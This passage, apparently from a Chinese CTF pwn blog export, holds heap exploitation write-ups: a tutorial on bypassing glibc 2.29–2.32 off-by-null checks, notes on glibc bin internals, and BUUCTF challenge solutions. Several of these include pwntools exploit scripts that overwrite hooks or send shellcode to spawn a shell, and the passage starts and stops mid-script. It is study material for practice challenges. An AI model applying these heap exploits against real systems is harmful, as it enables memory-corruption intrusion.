class="hljs-number">1</span>)<br>free(<span class="hljs-number">4</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x81</span>)  <span class="hljs-comment">#0x81让系统知道前面的堆块是被使用的</span><br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x1f0</span>,payload)<br>free(<span class="hljs-number">2</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(mlh-<span class="hljs-number">0x30</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">1</span>,payload)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(ogg))<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h1 id="glibc2-29-2-32-off-by-null-bypass"><a href="#glibc2-29-2-32-off-by-null-bypass" class="headerlink" title="glibc2.29~2.32 off by null bypass"></a>glibc2.29~2.32 off by null bypass</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>浏览大佬博客时，发现大佬竟然整理了一篇glibc2.29~2.32 off by null bypass，如获至宝，学习为敬！</p>
<p>博客地址：<a href="http://blog.wjhwjhn.com/archives/193/">http://blog.wjhwjhn.com/archives/193/</a></p>
<h2 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h2><p>在 glibc2.29 及以后版本，glibc 在 unlink 内加入了 prevsize check，而通过 off by null 漏洞根本无法直接修改正常 chunk 的 size，导致想要 通过unlink 制造出堆块重叠变得几乎不可能。当然 off by one 是没有影响的。所以在 2.29 及以上版本，off by null 的利用只有唯一的方法 —— 伪造 FD 和 BK</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp">    <span class="hljs-comment">/* consolidate backward */</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">prev_inuse</span>(p)) &#123;<br>  prevsize = <span class="hljs-built_in">prev_size</span> (p);<br>  size += prevsize;<br>  p = <span class="hljs-built_in">chunk_at_offset</span>(p, -((<span class="hljs-keyword">long</span>) prevsize));<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (<span class="hljs-built_in">chunksize</span>(p) != prevsize))<br>    <span class="hljs-built_in">malloc_printerr</span> (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br>  <span class="hljs-built_in">unlink_chunk</span> (av, p);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>但是伪造 FD 和 BK 需要绕过下面的检测才行 </p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))      <br>  malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);<br></code></pre></td></tr></table></figure>

<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="no-pie"><a href="#no-pie" class="headerlink" title="no pie"></a>no pie</h3><p>这种情况其实就是之前写过的unlink attack，劫持程序中用于<strong>储存堆块指针的数组</strong>，从而达成任意地址写的目的。详细情况请移步到该篇博客，这里就不再赘述</p>
<h3 id="拥有堆地址"><a href="#拥有堆地址" class="headerlink" title="拥有堆地址"></a>拥有堆地址</h3><p><img src="/2021/07/20/2021-07-26-offbyone&null/0ce506d87fdbbe100ec80d1bc6f87725.png"><span class="image-caption">图片</span></p>
<p>我们可以仿照上面的情况，在一个可以写入内容的堆块比如0x20的位置（ptr）上填入将要unlink的堆块地址，然后在将要unlink的堆块的 fd，bk 指针上写入<code>ptr-0x18</code>，<code>ptr-0x10</code>即可绕过检测，实现unlink</p>
<h3 id="无法泄露堆地址"><a href="#无法泄露堆地址" class="headerlink" title="无法泄露堆地址"></a>无法泄露堆地址</h3><p>不可泄露堆地址的各种方法归根结底都是通过<strong>部分写入</strong>和<strong>各种堆管理器的性质</strong>来改写出想要指向的堆块地址从而绕过检测</p>
<h4 id="一、在借用large-chunk上的垃圾数据"><a href="#一、在借用large-chunk上的垃圾数据" class="headerlink" title="一、在借用large chunk上的垃圾数据"></a>一、在借用large chunk上的垃圾数据</h4><p>当只有一个large chunk在 bin 链上时，fd_nextsize 和 bk_nextsize 是存放large chunk本身的堆地址。要利用这两个残余的垃圾的数据，把这两个数据作为我们要构造的 fake chunk 的 fd bk 指针。</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20211001161409749.png"><span class="image-caption">image-20211001161409749</span></p>
<p>首先这是 large chunk 的结构</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20211001164643331.png"></p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20211001161853438.png"><span class="image-caption">image-20211001161853438</span></p>
<p>这是经过伪造后的 large chunk 以及我们要用得一个可以被控制的 chunk ，首先从0x10开始作为 fake chunk 的堆头开始布置，通过部分写把 fake fd指针改为 chunk 的地址，同时部分写入修改 chunk bk 指针为 fake chunk，从而绕过第一个检查 FD-&gt;bk == p</p>
<p>接下来就是绕过第二个检查 BK-&gt;fd == p，我们利用fastbin的特性：会在fd指针留下前一块的堆地址，在 large chunk 的 fd 指针位置写入堆地址，然后借着部分写入修改为 fake chunk addr - 0x10。因为再加上本来的 bk_nextsize 就是指向 large chunk ，即可完成第二个检查的绕过。</p>
<p>tcache的话，在glibc 2.29以上的版本加入的key字段会破坏bk指针的内容，而在这之下的版本应该也很少会用到这么复杂的手法去构造</p>
<p>修改方法为：然后先释放一个堆块 a，再释放 largebin chunk，这时候再 largebin chunk + 0x10 的位置就会有一个 a 的指针。我们再用部分写入将指针改写成 largebin chunk + 0x10 的地址。</p>
<h4 id="二、利用-unsorted-bin-和-large-bin-链机制"><a href="#二、利用-unsorted-bin-和-large-bin-链机制" class="headerlink" title="二、利用 unsorted bin 和 large bin 链机制"></a>二、利用 unsorted bin 和 large bin 链机制</h4><p>这部分内容如果利用得当，可以在题目的苛刻的条件下（如会在末尾写入 x00 等…）也可以无需爆破伪造堆块</p>
<p>以下内容全部复制自大佬博客：</p>
<h5 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h5><h5 id="1-在-fd-和-bk-写堆地址"><a href="#1-在-fd-和-bk-写堆地址" class="headerlink" title="1. 在 fd 和 bk 写堆地址"></a>1. 在 fd 和 bk 写堆地址</h5><p>如下图所示，堆块 0x55555555bc00 是我们要用于构造的堆块地址。</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/4d011f51c99d6a925d5ee5c25aabdadd.png"><span class="image-caption">图片</span></p>
<p>通过 unsorted bin 链表我们让这个堆块的 fd 和 bk 都写了一个堆地址</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/dbe25454747c3469ac4c83297c0536c6.png"><span class="image-caption">图片</span></p>
<h6 id="构造图："><a href="#构造图：" class="headerlink" title="构造图："></a>构造图：</h6><p><img src="/2021/07/20/2021-07-26-offbyone&null/c4c7f62c37e418f3d4fc252601150155.png"><span class="image-caption">图片</span></p>
<p>其中辅助堆块的作用在之后会提及</p>
<h6 id="构造代码："><a href="#构造代码：" class="headerlink" title="构造代码："></a><strong>构造代码：</strong></h6><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#0 fd</span><br>add(<span class="hljs-number">0x108</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x438</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x108</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x428</span>) <span class="hljs-comment"># 5 bk </span><br>add(<span class="hljs-number">0x108</span>) <span class="hljs-comment"># 6</span><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure>



<h3 id="2-在伪造堆块附近申请堆块"><a href="#2-在伪造堆块附近申请堆块" class="headerlink" title="2. 在伪造堆块附近申请堆块"></a>2. 在伪造堆块附近申请堆块</h3><p>由于我们要通过部分写入的方法来绕过检测，而在堆空间中，只有低三字节是固定的。</p>
<p>所以我们为了逃避爆破，希望能够找到只需要覆盖最低一字节就可以修改成 fake chunk 的地址，于是我们应该利用在 fake 堆块附近 0x100 内的堆块来作为辅助堆块写地址，<strong>之前申请的辅助堆块就是起到了这个作用，我们可以利用这个堆块来进行重分配，使得分配的地址非常贴近利用堆块</strong>。</p>
<h4 id="构造图：-1"><a href="#构造图：-1" class="headerlink" title="构造图："></a>构造图：</h4><p><img src="/2021/07/20/2021-07-26-offbyone&null/8940fc1f7a2579bed0c78b865df9a6c9.png"><span class="image-caption">图片</span></p>
<p>可以发现，我们先让辅助堆块和利用堆块合并之后再对空间进行重新分配，使得堆块 2 恰好可以覆盖到之前利用堆块的 size，且堆块 3 的 0x55555555bc20，十分贴近之前 0x55555555bc00，只需要抹去最低一字节即可。</p>
<h4 id="构造代码：-1"><a href="#构造代码：-1" class="headerlink" title="构造代码："></a>构造代码：</h4><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">delete(<span class="hljs-number">2</span>) <span class="hljs-comment">#2 &amp; 3 unlink</span><br>add(<span class="hljs-number">0x438</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x418</span> + p64(<span class="hljs-number">0xA91</span>))  <span class="hljs-comment"># 0 set size</span><br>add(<span class="hljs-number">0x418</span>)  <span class="hljs-comment"># 2 c20</span><br>add(<span class="hljs-number">0x428</span>)  <span class="hljs-comment"># 3 bk 150</span><br>add(<span class="hljs-number">0x418</span>)  <span class="hljs-comment"># 5 fd 2b0</span><br></code></pre></td></tr></table></figure>



<h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><p>分配完成之后，我们再把全部堆块申请回来，这可能并不是步骤最少的做法，但是全部申请回来可以使得操作有条理，使得我们构造过程中出现的问题减少。</p>
<h3 id="3-修复-fake-fd"><a href="#3-修复-fake-fd" class="headerlink" title="3. 修复 fake fd"></a>3. 修复 fake fd</h3><h4 id="修复思路："><a href="#修复思路：" class="headerlink" title="修复思路："></a>修复思路：</h4><p>我们在之前的状态下，先删除 <strong>fake-&gt;FD 堆块</strong>，再删除<strong>重分配堆块 2（辅助堆块）</strong>。我们就可以在 <strong>fake-&gt;FD 堆块的 BK 位置</strong>写入一个<strong>重分配堆块 2（辅助堆块）</strong>的值</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/8926f053ddc0e4cc4366e19babb9f47e.png"><span class="image-caption">图片</span></p>
<p>再用部分写入一字节来覆盖，覆盖成<strong>利用堆块</strong>的指针</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/400f4af89ed8abec85d3e1567007d7b2.png"><span class="image-caption">图片</span></p>
<p>最后再把 bc20 这个辅助堆块申请回来，方便下一次使用。</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/e9f7b1f6bde94a7ee9b2816e4da7ea0e.png"><span class="image-caption">图片</span></p>
<h4 id="构造代码：-2"><a href="#构造代码：-2" class="headerlink" title="构造代码："></a>构造代码：</h4><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># partial overwrite fd -&gt; bk by unsorted bin list</span><br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x418</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">9</span>)  <span class="hljs-comment"># 2 partial overwrite bk</span><br>add(<span class="hljs-number">0x418</span>)  <span class="hljs-comment"># 5 c20</span><br></code></pre></td></tr></table></figure>



<h5 id="4-修复-fake-bk"><a href="#4-修复-fake-bk" class="headerlink" title="4. 修复 fake bk"></a>4. 修复 fake bk</h5><h6 id="修复思路：-1"><a href="#修复思路：-1" class="headerlink" title="修复思路："></a>修复思路：</h6><p>在我示例的这道题下，使用 unsorted bin 来修复另外 <strong>fake bk</strong> 是很难的，这是因为这道题如果要进 unsorted bin 的堆块，size 大小要大于等于 0x418，而这个 size 是在 largebin 范围内的。</p>
<p>所以如果我使用不同 size 申请的方法，错开<strong>辅助堆块</strong>去直接申请 <strong>fake bk 堆块（因为如果要在 fake bk-&gt;fd 的位置写堆值，那么在遍历的时候一定是先遍历到辅助堆块，所以需要错开辅助堆块先去申请 fake bk 堆块，我想到的方法就是申请一个辅助堆块无法提供的 size 来错开。但事实上，错开辅助堆块会使得辅助堆块进入 largebin 中，从而与原来的 fake bk 断链，这样原来已经写上的堆地址也不复存在）</strong>，因为这个原因所以这部分我要先让堆块进入 largebin 再用<strong>类似于修复 fake fd 的方法进行修复。</strong></p>
<p>先删除<strong>重分配堆块 2（辅助堆块）</strong>，再删除 <strong>fake-&gt;BK 堆块</strong>（注意：这里和上面顺序不一致，这是因为想要写入堆块地址的位置不一致）</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/7b03f181d1dbc20c0b2c7d698b6d8b38.png"><span class="image-caption">图片</span></p>
<p>再让堆块进入到 largebin 中</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/0d5737399f40b84abd6d99d282c0f2c8.png"><span class="image-caption">图片</span></p>
<p>再使用部分写入恢复 <strong>fake bk</strong></p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/e39634201bd2beefba9ec4e3821920e6.png"><span class="image-caption">图片</span></p>
<p>构造代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># partial overwrite bk -&gt; fd by largebin list</span><br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0x9F8</span>)  <span class="hljs-comment"># 3 chunk into largebin</span><br>add(<span class="hljs-number">0x428</span>, <span class="hljs-string">&#x27;a&#x27;</span>)  <span class="hljs-comment"># 5 partial overwrite fd</span><br>add(<span class="hljs-number">0x418</span>)  <span class="hljs-comment"># 7 c20</span><br></code></pre></td></tr></table></figure>

<h5 id="5-伪造-prev-size，off-by-null-修改-size-的-p-标志位"><a href="#5-伪造-prev-size，off-by-null-修改-size-的-p-标志位" class="headerlink" title="5. 伪造 prev_size，off by null 修改 size 的 p 标志位"></a>5. 伪造 prev_size，off by null 修改 size 的 p 标志位</h5><p>这部分内容不是本文重点故略过</p>
<h6 id="构造代码：-3"><a href="#构造代码：-3" class="headerlink" title="构造代码："></a>构造代码：</h6><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># off by null</span><br>add(<span class="hljs-number">0x108</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x111</span>))  <span class="hljs-comment"># 8</span><br>edit(<span class="hljs-number">6</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + p64(<span class="hljs-number">0xA90</span>))<br>delete(<span class="hljs-number">3</span>)  <span class="hljs-comment"># unlink</span><br></code></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>低版本的检查过少的时代已经一去不返，新版本的检查增多，使得利用手法也随之复杂，但本质都是堆块的良好布局，对各种bin链上用于管理而会残余的垃圾数据进行利用，以及在新版本下似乎有些趋向于利用 large chunk 构造堆块了。最后大佬使用的布置思想十分值得我这个小菜鸡深刻学习理解，为了避免爆破而构造出偏移在0x100内的堆块，膜拜pwn👴</p>
]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>bin链情况集合</title>
    <url>/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/</url>
    <content><![CDATA[<p><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210720154252123-1627363406388.png"><span class="image-caption">image-20210720154252123</span></p>
<h1 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h1><h3 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h3><ul>
<li><p>大小范围：0x20 - 0x80</p>
</li>
<li><p>单链表结构，只有fd指针</p>
</li>
<li><p>FILO（最后一个进入fastbin链表的，会被放在头部）<br>总共有十个fastbin链表，每个链表中fastbin的size一样，0x10递增<br>大小属于fastbin的chunk被free掉时，不会改变nextchunk的previnuse位，也就是说不会被合并。</p>
</li>
</ul>
<p><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210720154343954-1627363410633.png"><span class="image-caption">image-20210720154343954</span></p>
<h3 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h3><ul>
<li>被释放的堆块的fd指针不能指向自己（这也就是想要double free的时候，还需要一个中间chunk的原因）</li>
<li>将fastbin里面的chunk分配出去时，会检查size位会不会匹配chunk的大小，会才能分配</li>
</ul>
<h3 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h3><p>构造两个相同 size 的堆块 a 和 b，我们先 free (a) 让他进入到 fast bin 中，再 free (b) 也让他进入到 fast bin中。这时候，在堆块 b 的 fd 位置就存在着堆块 a 的地址，我们 leak 出来就能够得到堆地址</p>
<h1 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h1><h3 id="基本结构-1"><a href="#基本结构-1" class="headerlink" title="基本结构"></a>基本结构</h3><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210726103140256-1627266738935.png" style="zoom:80%;">



<ul>
<li><p>只有一个双向链表，存在fd和bk指针</p>
</li>
<li><p>在unsorted bin中，对chunk的大小并没有限制，任何大小的chunk（未被归类）都可以归属到unsorted bin中，临时存储用</p>
</li>
<li><p>unsortedbin采用的遍历顺序是FIFO</p>
</li>
<li><p>chunk被释放进入unsortedbin时，fdbk字段会留下一个main_arena的地址信息</p>
</li>
</ul>
<h3 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h3><p>libc-2.29.so以下：</p>
<p>利用前提是先有UAF，修改unsortedbin中的FD字段为0，BK字段为target addr - 0x10，然后malloc一个相同大小的chunk，即可完成攻击，在目标地址写入unsorted bin的地址，一般用来伪造堆头（制造出0x7f）、修改次数限制、上限信息、配合局部写</p>
<h3 id="小技巧-1"><a href="#小技巧-1" class="headerlink" title="小技巧"></a>小技巧</h3><p>当 unsorted bin 链上有两个堆块的时候，其中一个堆块的 fd 会指向另一个堆块，我们可以直接 leak 得到，可计算出堆基址</p>
<h1 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h1><h3 id="基本结构-2"><a href="#基本结构-2" class="headerlink" title="基本结构"></a>基本结构</h3><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210726103140256.png" style="zoom:80%;"><span class="image-caption">image-20210726103140256</span>

<ul>
<li>大小范围：0x90 - 0x400</li>
<li>由62个双向链表组成，每个链表中的chunk大小一样，大小以0x10递增，存在fd和bk指针</li>
<li>相邻的free chunk会触发合并操作，即合并成一个大的free chunk</li>
<li>采用的遍历顺序是FIFO</li>
</ul>
<h3 id="小技巧-2"><a href="#小技巧-2" class="headerlink" title="小技巧"></a>小技巧</h3><p>small bin 中存在两个块时，第一个块的fd指针指向main_arena，bk指针指向了下一个堆块，所以可以泄露出libc以及堆地址</p>
<h1 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h1><h3 id="基本结构-3"><a href="#基本结构-3" class="headerlink" title="基本结构"></a>基本结构</h3><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210720153655147.png" style="zoom:80%;"><span class="image-caption">image-20210720153655147</span>

<p><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210726103541056-1627363427270.png"><span class="image-caption">image-20210726103541056</span></p>
<ul>
<li>大小范围：0x410 以上</li>
<li>63个双向链表，不仅存在fd和bk指针，同时还有fd nextsize 和 bk nextsize</li>
<li>同一个双向链表中chunk大小可以不一样，但是在一定范围内，bins大小从小到大排列</li>
<li>相邻的free chunk会触发合并操作，即合并成一个大的free chunk</li>
<li>采用的遍历顺序是FIFO</li>
<li><strong>在这63个largebins中：第一组的32个largebin链</strong>依次以64字节步长为间隔，即第一个largebin链中chunksize为1024-1087字节，第二个large bin中chunk size为1088~1151字节。<strong>第二组的16个largebin链</strong>依次以512字节步长为间隔；<strong>第三组的8个largebin链</strong>以步长4096为间隔；<strong>第四组的4个largebin链</strong>以32768字节为间隔；<strong>第五组的2个largebin链</strong>以262144字节为间隔；<strong>最后一组</strong>的largebin链中的chunk大小无限制。</li>
</ul>
<h3 id="小技巧-3"><a href="#小技巧-3" class="headerlink" title="小技巧"></a>小技巧</h3><p>如果堆块在 largebin 中，他的 <strong>fd_nextsize</strong> 和 <strong>bk_nextsize</strong> 都会指向堆块地址，可以泄露出堆地址</p>
<p>如果largenbin上仅有一个堆块，那该堆块的fd_nextsize和bk_nextsize指向自身</p>
<h1 id="malloc过程"><a href="#malloc过程" class="headerlink" title="malloc过程"></a>malloc过程</h1><ul>
<li><p>计算真正堆块大小（加上头部长度、对齐）</p>
</li>
<li><p>是否在fastbin范围内？</p>
<ul>
<li>是，检查对应的bin链表中有没有chunk<ul>
<li>有，分配给用户，结束</li>
</ul>
</li>
</ul>
</li>
<li><p>如果不在fastbin范围内，或者没有chunk可用</p>
</li>
<li><p>是否在smallbin范围内？</p>
<ul>
<li>是，检查对应大小的bin链表中有没有chunk<ul>
<li>有，分配给用户，结束</li>
</ul>
</li>
</ul>
</li>
<li><p>如果不在smallbin范围内，或者smallbin里面也没有</p>
</li>
<li><p>unsortedbin中有没有chunk？</p>
<ul>
<li>有，从尾部取出第一个chunk，看看大小是否满足需求<ul>
<li>满足，切分后大小是否大于minsize？（64位下minisize为0x20）<ul>
<li>大于，切分块，返回给用户，剩下的块放进unsortedbin</li>
<li>小于或等于minsize，直接全部分配给用户，结束</li>
</ul>
</li>
<li>不满足，把这个块放入small/largebin对应的链表中，继续遍历下一个块</li>
</ul>
</li>
</ul>
</li>
<li><p>如果unsortedbin中所有的块也不能满足需求</p>
</li>
<li><p>大小是否在largebin范围？</p>
<ul>
<li>是，检查对应的bin链表中有没有符合的chunk<ul>
<li>有，找到满足需求最小的chunk，切分块返回，剩下的放进unsortedbin中</li>
</ul>
</li>
</ul>
</li>
<li><p>largebin也不行？再次遍历small/large寻找最合适的chunk</p>
</li>
<li><p>还是没有，那就从topchunk中切割</p>
</li>
<li><p>topchunk也不够？mmap系统调用</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>buu06</title>
    <url>/2021/06/05/2021-06-14-buu06/</url>
    <content><![CDATA[<h3 id="bjdctf-2020-router"><a href="#bjdctf-2020-router" class="headerlink" title="bjdctf_2020_router"></a>bjdctf_2020_router</h3><p>常规checksec一下，看看保护</p>
<p><img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210605121040.png"></p>
<p>只开启了NX</p>
<p>进入ida看看代码<img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210605121308.png"></p>
<p>第一个功能很神奇的让我们输入一个长度为0x10的数据，然后用system调用？我跑去nc了一下</p>
<p><img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210605121007.png"></p>
<p>好吧，成功获得flag了。</p>
<h3 id="picoctf-2018-shellcode"><a href="#picoctf-2018-shellcode" class="headerlink" title="picoctf_2018_shellcode"></a>picoctf_2018_shellcode</h3><p>checksec一下<img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210614103954.png"></p>
<p>保护都没开启，拖入ida分析一下。无法F5反汇编，只能看汇编代码了。</p>
<p><img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210614104047.png"></p>
<p><img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210614104037.png"></p>
<p>有个vuln函数，里面有调用gets和puts两个函数，可以进行输入。再看其他代码，底下有个call eax，可以进行执行代码，看下eax的内容来自哪里</p>
<p><img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210614104610.png"></p>
<p>这里传递给eax的地址与下面调用时一致，然后vuln函数里面gets输入的地址是ebp+8中存放的地址，其实就是eax里面的地址内容，所以整个程序总的说就是会执行我们输入进去的东西，加上nx未开，输入shellcode来getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">28165</span>)<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>shellcode=asm(shellcraft.sh())<br>p.sendlineafter(<span class="hljs-string">&quot;string!&quot;</span>,shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="hitcontraining-uaf"><a href="#hitcontraining-uaf" class="headerlink" title="hitcontraining_uaf"></a>hitcontraining_uaf</h3><p>常规checksec一下</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727132448387.png"><span class="image-caption">image-20210727132448387</span></p>
<p>进入ida看看，其实题目已经有暗示，uaf，所以我们先去delete函数里面看看，</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727132528641.png"><span class="image-caption">image-20210727132528641</span></p>
<p>确实存在着uaf，那么该怎么利用？再看看add函数和printf函数</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727132617843.png"><span class="image-caption">image-20210727132617843</span></p>
<p>这边的add函数比较奇怪，首先是有次数限制只能申请五个堆块，其次是会申请两个堆块，第一个堆块是固定8字节大小，前4个字节存放一个print_note_content函数的地址，后4个字节是我们可以控制的，申请一个任意大小的堆块</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727132832076.png"><span class="image-caption">image-20210727132832076</span></p>
<p>在print函数里面，最后会进行函数调用，就是调用先前在add函数里面保存的print_note_content函数进行打印我们可以控制的堆块里面的内容</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727133015119.png"><span class="image-caption">image-20210727133015119</span></p>
<p>最后就是还存在一个后门函数</p>
<p>思路：一开始是觉得没有edit这类的函数，可能是要制造堆块重叠，把后门函数劫持到malloc_hook里面去，还以为5个会够，但是一个泄露libc基址，再一个申请fastchunk进行double free，然后还需要申请四次，超过次数了</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727135534549.png"><span class="image-caption">image-20210727135534549</span></p>
<p>这是double free的fastbin上的情况，因为free也是两个，所以直接进行两次操作直接就可以构造出A-B-A</p>
<p>所以换一种方法：利用那个函数调用，想办法把进行调用的堆块变成是我们可以控制的那个堆块，把内容改成后门函数，那么就可以getshell了！</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727140624461.png"><span class="image-caption">image-20210727140624461</span></p>
<p>像这样，我们可以控制的堆块申请一个比0x8大的堆块，那么我们就不会申请走，而固定申请大小为0x8的堆块就会申请走一个，此时我们，如果再申请0x8的堆块，就会进行更换了，我们申请到的就是之前程序的固定堆块，最后printf一下，就getshell了！</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210727141018340.png"><span class="image-caption">image-20210727141018340</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;i386&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/ld-2.23.so&quot;</span>)<br><span class="hljs-comment">#p = process(argv=[ld.path,elf.path],env=&#123;&quot;LD_PRELOAD&quot; : libc.path&#125;)</span><br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26333</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span 